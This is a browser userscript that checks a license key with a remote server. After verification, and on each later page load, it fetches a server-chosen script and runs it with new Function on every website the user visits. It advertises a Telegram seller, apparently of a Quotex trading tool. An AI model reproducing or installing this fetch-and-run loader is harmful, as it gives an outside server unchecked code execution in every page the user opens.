// ==UserScript==
// @name         License Client & Server Code Runner
// @namespace    https://demotoliveadmin.lovable.app
// @version      3.5.0
// @description  Verifies license and executes remote server code dynamically
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  // --- কনফিগারেশন ---
  const API_BASE = 'https://demotoliveadmin.lovable.app';
  const TELEGRAM_URL = 'https://t.me/tradereyasin7';
  const AVATAR_URL = 'https://i.postimg.cc/W1xNxw0S/file-00000000acd08230b081904c2c4ce41c.png';

  // আপনি যদি কোনো আলাদা CDN বা সার্ভারে কোড রাখেন তবে এখানে URL দিতে পারেন
  const REMOTE_CODE_FALLBACK_URL = ''; 

  const STORAGE = {
    KEY: 'appActivation',
    TOKEN: 'appDeviceToken',
    DEVICE_ID: 'appDeviceId'
  };

  function getDeviceId() {
    let id = localStorage.getItem(STORAGE.DEVICE_ID);
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
      localStorage.setItem(STORAGE.DEVICE_ID, id);
    }
    return id;
  }

  function getMeta() {
    const ua = navigator.userAgent;
    return {
      browser: /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : 'Other',
      os: /Windows/.test(ua) ? 'Windows' : /Android/.test(ua) ? 'Android' : /Mac/.test(ua) ? 'macOS' : 'Other',
      device_type: /Mobile|Android/.test(ua) ? 'mobile' : 'desktop'
    };
  }

  // --- লাইসেন্স API কল ---
  async function apiCall(endpoint, payload) {
    const res = await fetch(`${API_BASE}${endpoint}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(payload)
    });
    return res.json();
  }

  async function activateLicense(key) {
    return apiCall('/api/public/license/activate', {
      license_key: key.trim(),
      device_id: getDeviceId(),
      ...getMeta()
    });
  }

  async function verifyLicense(key, token) {
    return apiCall('/api/public/license/verify', {
      license_key: key.trim(),
      device_id: getDeviceId(),
      device_token: token,
      ...getMeta()
    });
  }

  async function fetchBootstrap(key, token) {
    return apiCall('/api/public/client/bootstrap', {
      license_key: key.trim(),
      device_id: getDeviceId(),
      device_token: token,
      ...getMeta()
    });
  }

  // --- সার্ভার কোড ফেচ ও এক্সিকিউশন ইঞ্জিন ---
  async function loadAndExecuteServerCode(licenseKey, deviceToken) {
    console.log('[System] Fetching server release details...');
    
    try {
      const bootstrap = await fetchBootstrap(licenseKey, deviceToken);
      
      if (!bootstrap.valid) {
        console.error('[System] Bootstrap rejected: Invalid license or token.');
        showInvalidPopup();
        return;
      }

      // ১. রিলিজ ম্যানিফেস্ট থেকে স্ক্রিপ্ট লিঙ্ক খোঁজা
      let targetCodeUrl = bootstrap.release?.manifest?.script_url || REMOTE_CODE_FALLBACK_URL;

      if (targetCodeUrl) {
        console.log(`[System] Loading code from: ${targetCodeUrl}`);
        const response = await fetch(targetCodeUrl);
        if (!response.ok) throw new Error(`HTTP Error ${response.status}`);
        
        const rawCode = await response.text();
        
        // ২. কোড ডায়নামিকালি এক্সিকিউট করা
        const runner = new Function('licenseInfo', 'bootstrapData', rawCode);
        runner({ key: licenseKey, token: deviceToken }, bootstrap);
        
        console.log('[System] Remote code executed successfully!');
      } else {
        // যদি সার্ভারে কোনো বাহ্যিক ফাইল লিঙ্ক না থাকে, তবে ডিফল্ট ইনিশিয়ালাইজেশন
        console.log('[System] License verified. Ready to attach application logic.');
        startMainApplication(bootstrap);
      }
    } catch (err) {
      console.error('[System] Failed to load/run server code:', err);
    }
  }

  // সার্ভার কোড না পাওয়া গেলে লোকাল ইনিশিয়ালাইজেশন
  function startMainApplication(bootstrap) {
    console.log('[App] Core features unlocked for device:', getDeviceId());
  }

  // --- CSS Styles ---
  function injectStyles() {
    if (document.getElementById('eyasin-custom-styles')) return;
    const style = document.createElement('style');
    style.id = 'eyasin-custom-styles';
    style.textContent = `
      @keyframes gradientFlow {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
      }
      @keyframes warningPulse {
        from { text-shadow: 0 0 5px rgba(255, 51, 102, 0.5); }
        to { text-shadow: 0 0 15px rgba(255, 51, 102, 0.9), 0 0 20px rgba(255, 51, 102, 0.7); }
      }

      #settingsPopup {
        position: fixed;
        top: 50%; left: 50%;
        transform: translate(-50%, -50%) scale(0.9);
        width: calc(100% - 24px); max-width: 360px;
        padding: 14px 16px;
        background: rgba(30, 11, 54, 0.98);
        backdrop-filter: blur(12px);
        border-radius: 12px;
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
        text-align: center;
        border: 1px solid rgba(248, 0, 255, 0.25);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        color: #f8f8f8;
        z-index: 999999;
        opacity: 0; visibility: hidden;
        transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        box-sizing: border-box;
      }
      #settingsPopup::before {
        content: ''; position: absolute;
        top: 0; left: 0; right: 0; height: 4px;
        background: linear-gradient(to right, #f900ff, #00d9ff);
        background-size: 200% 200%;
        animation: gradientFlow 3s linear infinite;
        border-radius: 12px 12px 0 0;
      }
      #settingsPopup.show { opacity: 1; visibility: visible; transform: translate(-50%, -50%) scale(1); }
      #settingsPopup h2 {
        color: white; font-size: 12px; font-weight: 600; margin: 0 0 10px 0; padding: 8px;
        background: rgba(0,0,0,0.85); border-radius: 6px; border: 1px solid rgba(248, 0, 255, 0.3); line-height: 1.4;
      }
      #settingsPopup h2 .warning-text {
        color: #ff3366; font-weight: 700; display: block; margin-top: 2px;
        animation: warningPulse 2s infinite alternate;
      }
      .telegram-link { display: inline-block; margin: 4px auto 10px; }
      .telegram-link img {
        width: 44px; height: 44px; border-radius: 50%; object-fit: cover;
        border: 2px solid #00ff66; box-shadow: 0 0 12px rgba(0, 255, 102, 0.4);
      }
      #licenseSection {
        background: rgba(15, 5, 28, 0.6); padding: 12px; border-radius: 8px;
        border: 1px solid rgba(248, 0, 255, 0.15); margin-bottom: 12px;
      }
      #licenseSection h3 {
        color: #fff; font-size: 13px; font-weight: 700; margin: 0 0 10px 0;
        letter-spacing: 1px; background: linear-gradient(to right, #f900ff, #00d9ff);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      }
      #licenseInput {
        width: 100%; padding: 10px 12px; background: rgba(10, 4, 20, 0.9);
        border: 1px solid rgba(248, 0, 255, 0.3); border-radius: 8px; color: #fff;
        font-size: 13px; box-sizing: border-box; margin-bottom: 10px; text-align: center;
        outline: none; font-family: monospace;
      }
      #licenseInput:focus { border-color: #00d9ff; box-shadow: 0 0 10px rgba(0, 217, 255, 0.3); }
      #verifyBtn {
        width: 100%; padding: 11px; background: linear-gradient(135deg, #a800ff, #f900ff);
        color: white; border: none; border-radius: 8px; font-size: 13px; font-weight: 700;
        cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(249, 0, 255, 0.4);
      }
      #verifyBtn:disabled { background: #4b4b5a; cursor: not-allowed; box-shadow: none; }
      #verificationStatus { margin-top: 8px; font-size: 12px; }
      .verified-badge { color: #00ff88; font-weight: 600; }
      .unverified-badge { color: #ff3366; font-weight: 600; }
      #closeButton {
        width: 100%; padding: 10px; background: #ff4757; color: white; border: none;
        border-radius: 8px; font-size: 13px; font-weight: 700; cursor: pointer; margin-top: 6px;
      }
      .footer-note { font-size: 8px; color: rgba(255,255,255,0.4); margin-top: 10px; text-transform: uppercase; }

      /* Invalid Modal */
      #invalidLicenseModal {
        position: fixed; inset: 0; background: rgba(0,0,0,0.75); backdrop-filter: blur(6px);
        display: flex; align-items: center; justify-content: center; z-index: 1000000;
        opacity: 0; visibility: hidden; transition: 0.3s;
      }
      #invalidLicenseModal.show { opacity: 1; visibility: visible; }
      #invalidCard {
        background: #120d1c; border: 1px solid rgba(249, 0, 255, 0.3); border-radius: 16px;
        padding: 20px; max-width: 360px; width: 90%; color: #fff; text-align: center;
        box-shadow: 0 10px 40px rgba(0,0,0,0.8);
      }
      .inv-title-box {
        border: 1.5px solid #00d9ff; border-radius: 12px; padding: 12px; margin-bottom: 12px;
        background: rgba(0, 217, 255, 0.05);
      }
      .inv-icon {
        width: 44px; height: 44px; border-radius: 50%; background: linear-gradient(135deg, #a800ff, #00d9ff);
        display: flex; align-items: center; justify-content: center; margin: 0 auto 6px; font-weight: bold; font-size: 20px;
      }
      .inv-warning-box {
        background: rgba(255, 51, 102, 0.12); border-radius: 10px; padding: 12px;
        text-align: left; margin-bottom: 12px; font-size: 12px; line-height: 1.5;
      }
      .inv-contact-box { background: rgba(249, 0, 255, 0.08); border-radius: 10px; padding: 12px; margin-bottom: 14px; }
      .inv-tg-badge {
        display: inline-block; background: rgba(249, 0, 255, 0.2); color: #f900ff;
        padding: 6px 16px; border-radius: 6px; text-decoration: none; font-weight: 700; font-size: 13px; margin-top: 6px;
      }
      .inv-actions { display: flex; gap: 8px; }
      .inv-btn-contact {
        flex: 1; padding: 10px; background: #4a72ff; color: #fff; border: none; border-radius: 8px;
        font-weight: 600; cursor: pointer; text-decoration: none; font-size: 13px; display: inline-flex;
        align-items: center; justify-content: center;
      }
      .inv-btn-try {
        flex: 1; padding: 10px; background: #8a3ffc; color: #fff; border: none; border-radius: 8px;
        font-weight: 600; cursor: pointer; font-size: 13px;
      }
    `;
    document.head.appendChild(style);
  }

  // --- UI তৈরি ---
  function buildUI() {
    injectStyles();

    let settings = document.getElementById('settingsPopup');
    if (!settings) {
      settings = document.createElement('div');
      settings.id = 'settingsPopup';
      settings.innerHTML = `
        <h2>Developer: <strong>@tradereyasin7</strong> - <span class="warning-text">Buying from others will result in fraud!</span></h2>
        <a href="${TELEGRAM_URL}" target="_blank" class="telegram-link">
          <img src="${AVATAR_URL}" alt="Telegram">
        </a>
        <div id="licenseSection">
          <h3>LICENSE VERIFICATION</h3>
          <input type="text" id="licenseInput" placeholder="Enter your license key" value="${localStorage.getItem(STORAGE.KEY) || ''}" />
          <button id="verifyBtn">VERIFY LICENSE</button>
          <div id="verificationStatus">
            ${localStorage.getItem(STORAGE.KEY) ? '<span class="verified-badge">✓ Cached License</span>' : '<span class="unverified-badge">✗ Not Verified</span>'}
          </div>
        </div>
        <button id="closeButton">CLOSE</button>
        <div class="footer-note">Oblivion Comet Nebula Specter Comet Nimbus Quartz Inferno Quotex Blitz Drift</div>
      `;
      document.body.appendChild(settings);

      document.getElementById('verifyBtn').onclick = handleVerify;
      document.getElementById('closeButton').onclick = () => settings.classList.remove('show');
    }

    let invModal = document.getElementById('invalidLicenseModal');
    if (!invModal) {
      invModal = document.createElement('div');
      invModal.id = 'invalidLicenseModal';
      invModal.innerHTML = `
        <div id="invCard">
          <div class="inv-title-box">
            <div class="inv-icon">!</div>
            <h4 style="margin:0; font-size:15px; color:#00d9ff;">Invalid License Key</h4>
          </div>
          <div class="inv-warning-box">
            <strong style="color: #ff3366; font-size: 13px;">Invalid License!</strong><br/>
            You have not purchased a valid license yet. Without purchasing a license, you cannot use this service. Please buy an official license from the developer to get access.<br/><br/>
            <strong style="color: #ff3366;">Important:</strong> Purchase only from the official developer to avoid scams.
          </div>
          <div class="inv-contact-box">
            <div style="display:flex; align-items:center; justify-content:center; gap:8px;">
              <img src="${AVATAR_URL}" style="width:20px; height:20px; border-radius:50%;" alt="Telegram">
              <span style="font-size:13px; font-weight:600;">Developer Contact</span>
            </div>
            <a href="${TELEGRAM_URL}" target="_blank" class="inv-tg-badge">@tradereyasin7</a>
          </div>
          <div class="inv-actions">
            <a href="${TELEGRAM_URL}" target="_blank" class="inv-btn-contact">Contact Developer</a>
            <button class="inv-btn-try" id="invTryAgainBtn">Try Again</button>
          </div>
        </div>
      `;
      document.body.appendChild(invModal);

      document.getElementById('invTryAgainBtn').onclick = () => {
        invModal.classList.remove('show');
        settings.classList.add('show');
      };
    }
  }

  function showInvalidPopup() {
    document.getElementById('settingsPopup')?.classList.remove('show');
    document.getElementById('invalidLicenseModal')?.classList.add('show');
  }

  // --- ভেরিফিকেশন ও রানার ট্রিগার ---
  async function handleVerify() {
    const input = document.getElementById('licenseInput');
    const btn = document.getElementById('verifyBtn');
    const status = document.getElementById('verificationStatus');
    const key = input.value.trim();

    if (!key) {
      status.innerHTML = '<span class="unverified-badge">✗ License Key Required</span>';
      return;
    }

    btn.disabled = true;
    btn.textContent = 'VERIFYING...';
    status.innerHTML = '<span style="color:#00d9ff">Checking with server...</span>';

    try {
      let token = localStorage.getItem(STORAGE.TOKEN);
      let res;

      if (token) {
        res = await verifyLicense(key, token);
      }

      if (!token || !res.valid) {
        res = await activateLicense(key);
        if (res.valid && res.device_token) {
          token = res.device_token;
          localStorage.setItem(STORAGE.TOKEN, token);
        }
      }

      if (res.valid) {
        localStorage.setItem(STORAGE.KEY, key);
        status.innerHTML = '<span class="verified-badge">✓ Verified! Loading code...</span>';

        // সার্ভার থেকে কোড লোড ও রান করা
        await loadAndExecuteServerCode(key, token);

        setTimeout(() => {
          document.getElementById('settingsPopup')?.classList.remove('show');
        }, 1000);
      } else {
        localStorage.removeItem(STORAGE.KEY);
        status.innerHTML = `<span class="unverified-badge">✗ ${res.reason || 'Invalid License'}</span>`;
        showInvalidPopup();
      }
    } catch (err) {
      status.innerHTML = '<span class="unverified-badge">✗ Network Error</span>';
    } finally {
      btn.disabled = false;
      btn.textContent = 'VERIFY LICENSE';
    }
  }

  // --- পেজ লোড হলে স্বয়ংক্রিয় ব্যাকগ্রাউন্ড চেক ---
  async function startup() {
    buildUI();
    const key = localStorage.getItem(STORAGE.KEY);
    const token = localStorage.getItem(STORAGE.TOKEN);

    if (key && token) {
      try {
        const res = await verifyLicense(key, token);
        if (res.valid) {
          console.log('[System] Auto-verified active license.');
          await loadAndExecuteServerCode(key, token);
          return;
        }
      } catch (e) {
        console.warn('[System] Auto-check failed, waiting for user input.');
      }
    }

    // লাইসেন্স না থাকলে সরাসরি পপআপ আসবে
    document.getElementById('settingsPopup')?.classList.add('show');
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startup);
  } else {
    startup();
  }
})();
